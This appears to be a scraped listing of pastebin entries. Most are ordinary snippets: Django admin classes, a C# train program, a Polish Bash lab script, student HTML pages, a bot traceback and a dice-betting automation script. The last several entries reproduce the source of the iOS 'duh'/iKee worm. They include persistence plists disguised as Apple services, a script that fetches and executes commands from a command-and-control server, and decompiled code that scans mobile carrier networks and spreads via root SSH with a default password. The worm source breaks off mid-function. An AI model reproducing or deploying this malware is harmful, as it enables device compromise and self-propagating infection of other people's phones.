        return(random.choice([
            f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.chrome}.0.0.0 Safari/537.36',
            f'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.chrome}.0.0.0 Safari/537.36'
            ])
        )
        


"
HUyNVY1m,Exploring the Future of Cryptocurrency in 2024: Insights from BYDFi&#8217;s Chief Marketing Officer,livebetpro,PHP,Monday 25th of March 2024 03:47:57 AM CDT,https://www.livebetpro.com/exploring-the-future-of-cryptocurrency-in-2024-insights-from-bydfis-chief-marketing-officer/
sQPKa38z,sysop_2.1.5_Minimum,pan7nikt,Bash,Monday 25th of March 2024 03:44:48 AM CDT,"#2.1.5.1
#ZROB cd DO FOLDERU Z PROGRAMAMI
echo -e '\033[0;32m1. ROZMIAR PLIKU (statyczne wieksze)\033[0m'
stat -c %s prog
stat -c %s sprog
echo -e '\033[0;32m2. Biblioteki zewnetrzne a zainstalowane w systemie\033[0m'
ldd prog
ldd sprog
echo -e '\033[0;32m3. Liczba wywolan systemowych (wiecej dla skonsolidowanej dynamicznie)\033[0m'
#NIE WYSWIETLA SIE PROMPT ALE NADAL TRZEBA WPISAC ZNAKI LUB KLIKNAC ENTER PO PROSTU
strace -c ./prog |& grep 'calls\|total'
strace -c ./sprog |& grep 'calls\|total'
#uruchomic w oddzielnych oknach/sesjach ssh
./prog
./sprog
#podczas, gdy procesy sa uruchomione
echo -e '\033[0;32m4. Liczba nieanonimowych segmentow pameci w mapie pamieci (wicej dla skonsolidowanego dynamicznie)\033[0m'
pidof prog
pidof sprog
pmap -x PID_PROG
pmap -x PID_SPROG
#text/zmienne/stale?????
echo -e '\033[0;32mOkreslanie rodzaju zastosowanej konsolidacji\033[0m'
echo -e '\033[0;32mdla biblioteki\033[0m'
file /usr/lib64/libc.so.6
echo -e '\033[0;32mdla programu statycznie skonsolidowanego\033[0m'
file prog
echo -e '\033[0;32mdla programu dynamicznie skonsolidowanego\033[0m'
file sprog

#2.1.5.2
echo -e '\033[0;32mLista bibliotek wymaganych przez program\033[0m'
ldd prog
echo -e '\033[0;32mi biblioteke skonsolidowana dynamicznie\033[0m'
ldd /usr/lib64/libc.so.6
echo -e '\033[0;32mWszystkie biblioteki zarzadzane przez linker\033[0m'
ldconfig -p

#2.1.5.3
echo -e '\033[0;32mCzas przetwarzania w trybie nieuprzywilejowanym\033[0m'
time ls
echo -e '\033[0;32mCzas przetwarzania w trybie uprzywilejowanym\033[0m'
time sudo ls

#2.1.5.4
echo -e '\033[0;32mPorownanie ilosci zgloszen wywolan systemowych\033[0m'
strace -c ./prog |& grep 'calls\|total'
strace -c ./sprog |& grep 'calls\|total'"
uKSvqL1V,postfix evaluate,haikid,Java,Monday 25th of March 2024 03:43:11 AM CDT,"double evalute() {
	OurStack<String> postFixStack = new OurStack<String>();

	while (!postFix.isEmpty())
	{
		curr = postFix.remove();
		
		if (!isoperand(curr)) { 
			// curr is +, -, *, /

			double operand2 = postFixStack.pop();
			double operand1 = postFixStack.pop();

			if curr == ""+""
				postFixStack.push(operand1 + operand2);
			else if curr == ""-""
				postFixStack.push(operand1 - operand2);
			else if curr == ""*""
				postFixStack.push(operand1 * operand2);
			else
				postFixStack.push(operand1 / operand2);
		} else { 
			// curr is a number

			postFixStack.push(Double.parseDouble(curr));
		}
	}

	return postFixStack.peek(); // last number remaining on stack
}"
WKSBJYJT,admin.py for comments,horozov86,Python,Monday 25th of March 2024 02:45:55 AM CDT,"from django.contrib import admin
from .models import Comment

@admin.register(Comment)
class CommentAdmin(admin.ModelAdmin):
    list_display = ('text', 'date_time_of_publication', 'to_place')
    search_fields = ('text',)
    list_filter = ('date_time_of_publication',)
"
j3DTLU5c,admin.py for app destination,horozov86,Python,Monday 25th of March 2024 02:29:09 AM CDT,"from django.contrib import admin
from .models import Place

@admin.register(Place)
class PlaceAdmin(admin.ModelAdmin):
    list_display = ('name', 'location', 'rating', 'category', 'user')
    list_filter = ('category', 'rating')
    search_fields = ('name', 'location')
    ordering = ('name', '-rating')

    actions = ['custom_action']

    fieldsets = (
        (None, {
            'fields': ('name', 'description', 'location', 'rating', 'image_url', 'category', 'user')
        }),
        ('Advanced options', {
            'classes': ('collapse',),
            'fields': ('field_name',),
        }),
    )
"
jGiGjwpC,SPA код topcor - LST-2619,Luxup,HTML,Monday 25th of March 2024 02:02:01 AM CDT,"<!-- bibimot.ru [M] горизонтальный стики -->
<script async type=""text/javascript"" src=""//s.luxcdn.com/t/229477/360_light.js""></script>
<div id='lx_718250_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_718250_wrapper', '_229477', '_718250');});
</script>
</div>

<!-- topcor.ru [M] горизонтальный стики -->
<script async type=""text/javascript"" src=""//s.luxcdn.com/t/229476/360_light.js""></script>
<div id='lx_718249_wrapper'>
<script>
(window.__lxGc__=window.__lxGc__||{'s':{},'b':0}).cmd=window.__lxGc__.cmd||[];
__lxGc__.cmd.push(function(){__lxGc__.display('lx_718249_wrapper', '_229476', '_718249');});
</script>
</div>
"
Jzhffbmt,PassengerTrainConfigurator,UrayFenn,C#,Monday 25th of March 2024 01:59:18 AM CDT,"namespace PassengerTrainConfigurator
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandStartFlight = ""1"";
            const string CommandExit = ""2"";

            Depot depot = new Depot();
            bool isWork = true;

            while (isWork)
            {
                depot.ShowFlights();

                Console.WriteLine($""{CommandStartFlight} - Сформировать поезд\n"" +
                    $""{CommandExit} - Выйти."");

                Console.Write(""Введите команду: "");
                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case CommandStartFlight:
                        depot.Depart();
                        break;

                    case CommandExit:
                        isWork = false;
                        break;

                    default:
                        Console.WriteLine(""Такой команды нет"");
                        break;
                }

                Console.WriteLine(""Нажмите любую клавишу.."");
                Console.ReadKey();
                Console.Clear();
            }
        }
    }

    class Depot
    {
        private static readonly Random _random = new Random();
        private readonly List<Train> _trains = new List<Train>();

        public void ShowFlights()
        {
            Console.WriteLine(""Сейчас в пути: "");

            foreach (Train train in _trains)
            {
                Console.WriteLine($""Маршрут: {train.DeparturePoint} - {train.PlaceOfArrival}, Пассажиры: {train.CountOfPassengers}\n\n"");
            }
        }

        public void Depart()
        {
            int ticketsQuantity = SellTickets();
            CreateRoute(out string departurePoint, out string placeOfArrival);

            _trains.Add(new Train(departurePoint, placeOfArrival, ticketsQuantity));

            Console.WriteLine($""Поезд по маршруту {departurePoint} - {placeOfArrival} с {ticketsQuantity} пассажирами отправлен"");
        }

        private int SellTickets()
        {
            int minNumber = 20;
            int maxNumber = 200;

            int ticketsQuantity = _random.Next(minNumber, maxNumber);
            Console.WriteLine($""Куплено билетов: {ticketsQuantity}"");

            return ticketsQuantity;
        }

        private void CreateRoute(out string departurePoint, out string placeOfArrival)
        {
            bool isInputEmpty;

            do
            {
                Console.WriteLine(""Введите откуда и куда вы хотите поехать."");

                Console.Write(""Откуда: "");
                departurePoint = Console.ReadLine();

                Console.Write(""Куда: "");
                placeOfArrival = Console.ReadLine();

                isInputEmpty = (departurePoint == null) || (placeOfArrival == null);

            } while (departurePoint == placeOfArrival || isInputEmpty);

            Console.WriteLine($""\nПуть: {departurePoint} - {placeOfArrival}"");
        }
    }

    class Train
    {
        private List<Carriage> _carriages;

        public Train(string departurePoint, string placeOfArrival, int countOfPassengers)
        {
            DeparturePoint = departurePoint;
            PlaceOfArrival = placeOfArrival;
            CountOfPassengers = countOfPassengers;

            SetCarriagesQuantity();
            Fill();
        }

        public string DeparturePoint { get; private set; }
        public string PlaceOfArrival { get; private set; }
        public int CarriagesQuantity { get; private set; }
        public int CountOfPassengers { get; private set; }

        private void Fill()
        {
            _carriages = new List<Carriage>();

            for (int i = 0; i < CarriagesQuantity; i++)
                _carriages.Add(new Carriage());
        }

        private void SetCarriagesQuantity()
        {
            Carriage carriage = new Carriage();
            CarriagesQuantity = CountOfPassengers / carriage.Capacity + 1;

            Console.WriteLine($""Вагонов в поезде: {CarriagesQuantity} "" +
                $""\nВместимость вагонов: {carriage.Capacity} человек"");
        }
    }

    class Carriage
    {
        public int Capacity { get; private set; } = 30;
    }
}"
qm1QnE3b,snowybot,coinwalk,JavaScript,Monday 25th of March 2024 01:44:42 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var monkey = Number((olsenest/1000).toFixed(7));
var bolux = monkey;
var tens = (monkey*10);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var feeble = ((Math.floor(olsenest/tens))*tens);
var olsen = parseFloat(feeble);
var awesome = parseFloat(feeble);
var whare = olsenest;
var upper = 6.9;
var downer = 2.9;
var belance = olsenest;
var fart = 4;
 
 
function soiled(){
belance = document.getElementById('pct_balance').value;
feeble = ((Math.floor(belance/tens))*tens);
if (belance>(olsen+(bolux*upper))){
    bolux = bolux*2;
    upper = 4.9;
    downer = 4.9;
    fran = false;
    olsen = parseFloat(belance);
}
if ((belance<(olsen-(bolux*downer)))&&(fran)){
    bolux = bolux*2;
    upper = 4.9;
    downer = 4.9;
    fran = false;
    olsen = parseFloat(belance);
}
if ((belance<(olsen-(bolux*downer)))&&(!fran)){
    upper = 4.9;
    downer = 4.9;
    fran = true;
    olsen = parseFloat(belance);
}
if ((((belance/30)-bolux)<=0)&&(belance<(feeble+sevens))&&(belance<whare)){
    bolux = monkey;
    upper = 6.9;
    downer = 2.9;
    fart = 0;
    fran = true;
    olsen = parseFloat(feeble);
    whare =  parseFloat(belance);
}
if ((belance>(awesome*1.044))&&(belance<(feeble+sevens))){
    monkey = Number(((parseFloat(belance))/1000).toFixed(7));
    tens = (monkey*10);
    sevens = (monkey*6.9);
    eights = (monkey*7.9);
    bolux = monkey;
    upper = 6.9;
    downer = 2.9;
    fart = 4;
    olsen = parseFloat(feeble);
    whare =  parseFloat(belance);
    awesome = parseFloat(feeble);
}
if (belance>=(14400)){
console.log(""winner winner chicken dinner"");
return;
}
var dog = ((belance-olsenest).toFixed(8));
console.log(""profit"");
console.log(dog);
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() =>soiled(), 1);
}
soiled();"
PWM8p8jL,zadan.html,ml1,HTML,Monday 25th of March 2024 01:27:28 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Задания по лабораторной работе</title>
</head>
<body>
    <h1>Задания по лабораторной работе</h1>
    <ol>
        <li>Создать файл my.html с данными: имя, фамилия, отчество, группа, специальность. Использовать разные шрифты и выравнивания.</li>
        <li>Добавить три горизонтальные линии после фамилии, имени, отчества. Линии должны иметь разный тип. После этого ввести столбиком изучаемые предметы этой сессии.</li>
        <li>Изменить в своем файле начертание (стиль шрифта) группы, факультета, название предметов.</li>
        <li>Открыть свой файл и преобразовать список предметов в нумерованный список. Создать маркированный список своих интересов (хобби), сопроводив его заголовком.</li>
        <li>Создать другой файл, назовите его zadan.html. Открыть свой файл и создать в нем ссылку с именем «задания по лабораторной работе». В файл zadan.html указать все задания, которые перечислены в данной практической работе.</li>
        <li>Найти на компьютере графические файлы и включить их в состав своего файла my.html.</li>
        <li>Используя разные цветовые гаммы определить цвет фона и цвет каждого шрифта, используемого в документе.</li>
        <li>Создать в своем документе расписание занятий на текущую неделю.</li>
    </ol>
</body>
</html>"
8PL7Dj1U,my.html,ml1,HTML,Monday 25th of March 2024 01:22:05 AM CDT,"<!DOCTYPE html>
<html lang=""ru"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Обо мне</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        h1 {
            font-family: Georgia, serif;
            text-align: center;
        }
        p {
            text-align: center;
        }
        .line1 {
            border-top: 1px solid black;
        }
        .line2 {
            border-top: 2px dashed black;
        }
        .line3 {
            border-top: 3px dotted black;
        }
        .group {
            font-style: italic;
        }
        .faculty {
            font-weight: bold;
        }
        .subject {
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <h1>Я</h1>
    <p>Лапин Максим Александрович</p>
    <p class=""line1"">Группа: <span class=""group"">313</span></p>
    <p class=""line2"">Факультет: <span class=""faculty"">Информационные системы и программирование</span></p>
    <p class=""line3"">Специальность: Разработчик веб и мультимедийных приложений</p>
    <hr>
    <h2>Изучаемые предметы этой сессии:</h2>
    <ul>
        <li class=""subject"">МДК 08.01</li>
        <li class=""subject"">МДК 07.01</li>
        <li class=""subject"">МДК 05.03</li>
    </ul>
    <h2>Мои хобби:</h2>
    <ul>
        <li>Компьютерные игры</li>
        <li>Программирование</li>
        <li>Профессиональная прокрастинация</li>
    </ul>
</body>
</html>
"
hhz6aLwj,Untitled,Cartes010,GetText,Monday 25th of March 2024 12:55:54 AM CDT,"Cheat Expired,Silahkan download yang terbaru."
VQBefdSZ,ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None],basedcount_bot,Python,Monday 25th of March 2024 12:04:04 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 992, in _wrap_create_connection
    return await self._loop.create_connection(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1112, in create_connection
    transport, protocol = await self._create_connection_transport(
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/.pyenv/versions/3.11.7/lib/python3.11/asyncio/base_events.py"", line 1145, in _create_connection_transport
    await waiter
ConnectionAbortedError: SSL handshake is taking longer than 60.0 seconds: aborting the connection

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 46, in wrapper
    await func(lemmy_instance, databased)
  File ""/root/Bots/basedcount_bot_lemmy/basedcount_bot.py"", line 228, in read_comments
    async for comment in lemmy_instance.stream_comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/async_lemmy.py"", line 64, in stream_comments
    comments = await self.request_builder.get(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/async_lemmy_py/request_builder.py"", line 57, in get
    async with self.client_session.get(url, headers=headers, params=params) as resp:
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/client.py"", line 1194, in __aenter__
    self._resp = await self._coro
                 ^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/client.py"", line 578, in _request
    conn = await self._connector.connect(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 544, in connect
    proto = await self._create_connection(req, traces, timeout)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 911, in _create_connection
    _, proto = await self._create_direct_connection(req, traces, timeout)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1235, in _create_direct_connection
    raise last_exc
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1204, in _create_direct_connection
    transp, proto = await self._wrap_create_connection(
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/.venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1000, in _wrap_create_connection
    raise client_error(req.connection_key, exc) from exc
aiohttp.client_exceptions.ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None]
"
WWhMQJpe,worm/scripts/com.apple.ksyslog.plist,FlyFar,XML,Sunday 24th of March 2024 11:48:31 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple Computer//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
        <dict>
			<key>Label</key>
				<string>com.apple.ksyslog</string>
            <key>ProgramArguments</key>
            <array>
				<string>/private/var/mobile/home/sshd</string>
            </array>
            <key>RunAtLoad</key>
				<true/>
			<key>KeepAlive</key>
				<true/>
		</dict>
</plist>"
yRfTjxpk,worm/scripts/com.apple.period.plist,FlyFar,XML,Sunday 24th of March 2024 11:47:53 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple Computer//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
        <dict>
			<key>Label</key>
				<string>com.apple.period-aily</string>
            <key>ProgramArguments</key>
            <array>
				<string>/private/var/mobile/home/syslog</string>
            </array>
             <key>StartInterval</key>
				<integer>300</integer>
		</dict>
</plist>"
qxr7D3tp,worm/scripts/syslog,FlyFar,Bash,Sunday 24th of March 2024 11:46:05 PM CDT,"#!/bin/sh
cd /private/var/mobile/home/
ID=$(cat /etc/rel)  # Get bot client ID
PATH=.:$PATH
# invoke ""duh"" application - which checks in to C&C server with bot client ID
# The C&C server replies are stored in file .tmp, which is then interrogated for new commands
# via the check function
/private/var/mobile/home/duh SERVER /xml/p.php?id=$ID > /private/var/mobile/home/.tmp
check;

function check {
    if test 2 -lt $(wc -l .tmp | cut -d "" "" -f 1)
    then
	sh /private/var/mobile/home/.tmp
    fi
}"
a08WPnsP,worm/duh.c,FlyFar,C,Sunday 24th of March 2024 11:45:24 PM CDT,"#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netdb.h>
#include <string.h>

int create_tcp_socket();
char *get_ip(char *host);
char *build_get_query(char *host, char *page);
void usage();

#define HOST ""127.0.0.1""
#define PAGE ""/""
#define PORT 80
#define USERAGENT ""HTMLGET 1.0""

int main(int argc, char **argv)
{
  struct sockaddr_in *remote;
  int sock;
  int tmpres;
  char *ip;
  char *get;
  char buf[BUFSIZ+1];
  char *host;
  char *page;

  host = argv[1];
  if(argc > 2){
    page = argv[2];
  }else{
    page = PAGE;
  }
  sock = create_tcp_socket();
  ip = get_ip(host);
  remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
  remote->sin_family = AF_INET;
  tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr)));
  if( tmpres < 0)  
  {
    perror(""Can't set remote->sin_addr.s_addr"");
    exit(1);
  }else if(tmpres == 0)
  {
    fprintf(stderr, ""%s is not a valid IP address\n"", ip);
    exit(1);
  }
  remote->sin_port = htons(PORT);

  if(connect(sock, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0){
    perror(""Could not connect"");
    exit(1);
  }
  get = build_get_query(host, page);
  
  
  int sent = 0;
  while(sent < strlen(get))
  { 
    tmpres = send(sock, get+sent, strlen(get)-sent, 0);
    if(tmpres == -1){
      perror(""Can't send query"");
      exit(1);
    }
    sent += tmpres;
  }
                   
  memset(buf, 0, sizeof(buf));
  int htmlstart = 0;
  char * htmlcontent;
  while((tmpres = recv(sock, buf, BUFSIZ, 0)) > 0){
    if(htmlstart == 0)
    {
      htmlcontent = strstr(buf, ""\r\n\r\n"");
      if(htmlcontent != NULL){
        htmlstart = 1;
        htmlcontent += 4;
      }
    }else{
      htmlcontent = buf;
    }
    if(htmlstart){
      fprintf(stdout, htmlcontent);
    }
 
    memset(buf, 0, tmpres);
  }
  if(tmpres < 0)
  {
    perror(""Error receiving data"");
  }
  free(get);
  free(remote);
  free(ip);
  close(sock);
  return 0;
}

int create_tcp_socket()
{
  int sock;
  if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){
    perror(""Can't create TCP socket"");
    exit(1);
  }
  return sock;
}


char *get_ip(char *host)
{
  struct hostent *hent;
  int iplen = 15;
  char *ip = (char *)malloc(iplen+1);
  memset(ip, 0, iplen+1);
  if((hent = gethostbyname(host)) == NULL)
  {
    herror(""Can't get IP"");
    exit(1);
  }
  if(inet_ntop(AF_INET, (void *)hent->h_addr_list[0], ip, iplen) == NULL)
  {
    perror(""Can't resolve host"");
    exit(1);
  }
  return ip;
}

char *build_get_query(char *host, char *page)
{
  char *query;
  char *getpage = page;
  char *tpl = ""GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n"";
  if(getpage[0] == '/'){
    getpage = getpage + 1;
  }
  
  query = (char *)malloc(strlen(host)+strlen(getpage)+strlen(USERAGENT)+strlen(tpl)-5);
  sprintf(query, tpl, getpage, host, USERAGENT);
  return query;
}"
PXBY8pmU,worm/sshd.c,FlyFar,C,Sunday 24th of March 2024 11:43:05 PM CDT,"/* 
   This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2015 Hex-Rays <info@hex-rays.com>

   Detected compiler: GNU C++
   
   /// NOTE ///
   As you can see, the 'duh' worm of 2009 is just another
   iKee variant, the decompiled code is VERY much the exact same
   except that debug messages were mostly removed, and the infection
   routine was modified...
   /// END ///
*/

#include ""sshd.h""

int fdlock;

//----- (00001984) --------------------------------------------------------
char *randHost() // Generates a random SubNet to scan...
{
  char *retme;
  int x = random() % 255;
  int y = random() % 255;
  int z = random() % 255;

  srand(time(0));
  asprintf(&retme, ""%i.%i.%i."", x, y, z);
  return retme;
}

//----- (00001A80) --------------------------------------------------------
int get_lock(void) // Sets/Gets the status of the file lock located in /var/lock/ssh.lock
{
    struct flock fl;
    fl.l_type = F_WRLCK;
    fl.l_whence = SEEK_SET;
    fl.l_start = 0;
    fl.l_len = 1;
    if((fdlock = open(""/var/lock/ssh.lock"", O_WRONLY|O_CREAT, 0666)) == -1)
      return 0;
    if(fcntl(fdlock, F_SETLK, &fl) == -1)
      return 0;
    return 1;
}

//----- (00001B70) --------------------------------------------------------
char *getAddrRange()
{
  struct ifaddrs, *ifaddr, *ifa;
  int family, s;
  char host[NI_MAXHOST];]

  if (getifaddrs(&ifaddr) == -1) {
    perror(""getifaddrs"");
    exit(EXIT_FAILURE);
  }
  for (ifa = ifaddr; ifa != NULL; i = ifa->ifa_next) {
    family = ifa->ifa_addr->sa_family;
    if (family == AF_INET || family == AF_INET6)
    {
      s = getnameinfo(ifa->ifa_addr,(family == AF_INET) ? sizeof(struct sockaddr_in): sizeof(struct sockaddr_in6), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
      if (s != 0) {
        printf(""getnameinfo() failed: %s\n"", gai_strerror(s));
        return ""0.0.0.0-0.0.0.0"";
      }
      if (!strcmp(ifa->ifa_name, ""pdp_ip0"")) {
      	char *wee[20];
        tokenise(host, wee, ""."");
        int octc = atoi(wee[2]);
        asprintf((char*)&range, ""%s.%s.%i.0-%s.%s.%i.255"", wee[0], wee[1], octc, wee[0], wee[1], octc+2);
        return (char*)range;
      }
    }
  }
  freeifaddrs(ifaddr);
  return ""0.0.0.0-0.0.0.0"";
}

//----- (00001DB4) --------------------------------------------------------
int tokenise(char *input[], char *token[], char *spl)
{
  char *tokens;
  int count = 0;
  
  tokens = strtok(input, spl);
  
  if(tokens[strlen(tokens)-1] == '\n') tokens[strlen(tokens)-1] = '\0';
  token[count] = tokens;
  while(tokens != NULL) {
  	count++;
  	if(count > 4096) return (-1);
  	tokens = strtok(NULL, spl);
  	if(tokens != NULL) {
  		if(tokens[strlen(tokens)-1] == '\n') tokens[strlen(tokens)-1] = '\0';
	  }
	token[count] = tokens;
  }
  return count;
}

//----- (00001F1C) --------------------------------------------------------
int main() {
  if (get_lock()) {
    sleep(60);
    char *ipRanges[] = { getAddrRange(), 				// Local Net
    					 ""94.157.100.0-94.157.255.255"", // T-mobile, Netherlands
    					 ""87.103.52.255-87.103.66.255"", // Vodafone, Portugal
    					 ""94.157.0.0.0-120.157.99.255"", // T-mobile, Netherlands
    					 ""114.72.0.0-114.75.255.255"", 	// OPTUSINTERNET, Australia
    					 ""92.248.90.0-92.248.120.255"",	// MOBILKOM, Austria
    					 ""81.217.74.0-81.217.74.255"",	// Kabelsignal AG, Austria
    					 ""84.224.60.0-84.224.80.255"",	// Pannon GSM Telecommunications Inc, Hungary
    					 ""188.88.100.0-188.88.160.255"",	// T-mobile, Netherlands
    					 ""77.248.140.0-77.248.146.255"",	// UPC broadband, Austria
    					 ""77.54.160.0-77.54.190.255"",	// Vodafone, Portugal
    					 ""80.57.116.0-80.57.131.255"",	// UPC broadband, Austria
    					 ""84.224.0.0-84.224.63.255"" };	// Pannon GSM Telecommunications Inc, Hungary
    while(1) {
      for(int j = 0; j < sizeof(ipRanges); ++j) {
      	scanner(ipRanges[j]);
      	for (int k = 0; k <= 2; ++k) {
          randSubNet = randHost();
          char *zeRange;
          asprintf(&zeRange, ""%s.0-%s.255"", randSubNet, randSubNet);
          scanner(zeRange);
      }
    }
  }
  return 1;
}

//----- (00002110) --------------------------------------------------------
void scanner(char *ipRange)
{
    char *wee[10];
    char *begin[10];
    char *end[10];
    tokenise(ipRange, wee, ""-"");
    int octaB, octaE, octbB, octbE, octcB, octcE;
    tokenise(wee[0], begin, ""."");
    tokenise(wee[1], end, ""."");
    octaB = atoi(begin[0]);
    octaE = atoi(end[0]);
    octbB = atoi(begin[1]);
    octbE = atoi(end[1]);
    octcB = atoi(begin[2]);
    octcE = atoi(end[2]);
    
    for (int loop1=octaB; loop1<=octaE; loop1++)
    {
        for (int loop2=octbB; loop2<=octbE; loop2++)
        {
            for (int loop3=octcB; loop3<=octcE; loop3++)
            {
                for (int loop4=0; loop4<=255; loop4++)
                {
                    char* host;
                    asprintf(&host, ""%i.%i.%i.%i"", loop1, loop2, loop3, loop4);
                    if (!scanHost(host) && !checkHost(host))
                    {
                        initfst(host);
                    }
                }
            }
        }
    }
}

//----- (00002314) --------------------------------------------------------
int scanHost(char* host)
{
    int res, valopt, soc;
    struct sockaddr_in addr;
    long arg;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    soc = socket(AF_INET, SOCK_STREAM, 0);
    arg = fcntl(soc, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(soc, F_SETFL, arg);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(22);
    addr.sin_addr.s_addr = inet_addr(host);
    res = connect(soc, (struct sockaddr *)&addr, sizeof(addr));
    if (res < 0) {
      if (errno == EINPROGRESS) {
        tv.tv_sec = 10;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(soc, &myset);
        if (select(soc+1, NULL, &myset, NULL, &tv) > 0) {
            lon = sizeof(int);
            getsockopt(soc, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
            if (valopt) {
              return -1;
            }
        }
        else {
            return -1; }
      }
      else { return -1; }
    }
    close(soc);
    return 0;
}

//----- (000024E0) --------------------------------------------------------
int checkHost(char *host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    syslog(LOG_DEBUG, ""%s"", host); // One of the few times he decides to call a SYSLOG.
    asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s 'echo 99'"", VULN_PASS, host);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, 2, in) != NULL) {
        	if (strcmp(buff, ""99""))
            	return 0;
    	}
    }
    pclose(in);
    return -1; // NOT VULN
}

//----- (000025DC) --------------------------------------------------------
int runCommand(char* command, char *host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s '%s ; echo 99'"", VULN_PASS, host, command);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, 2, in) != NULL) {
        	if (strcmp(buff, ""99"")) return 0;
    	}
    }
    pclose(in);
    return -1;
}

//----- (000026D8) --------------------------------------------------------
int prunCommand(char* command, char *host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s '%s'"", VULN_PASS, host, command);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, sizeof(buff), in) != NULL) {
        	printf(""%s"", buff);
    	}
    }
    pclose(in);
    return -1;
}

//----- (000027BC) --------------------------------------------------------
int CopyFile(char* src, char* dst, char* host) {
    FILE *in;
    extern FILE *popen();
    char buff[512];
    char *execLine;
    asprintf(&execLine, ""sshpass -p %s scp -o StrictHostKeyChecking=no ./%s root@%s:%s"", VULN_PASS, src, host, dst);
    if (in = popen(execLine, ""r"")) {
    	while (fgets(buff, sizeof(buff), in) != NULL) {}
    	asprintf(&execLine, ""sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s 'which %s'"", VULN_PASS, host, dst);
    	if (in = popen(execLine, ""r"")) {
    		while (fgets(buff, 2, in) != NULL ) {
        		if (strcmp(buff, dst))
            		return 0;
    		}
    		return -1;
    	}
    	return -1;
    }
    pclose(in);
    return -1;
}

//----- (0000294C) --------------------------------------------------------
int initfst(char *host) {
  if (!runCommand(""mkdir /private/var/mobile/home"", host))
  {
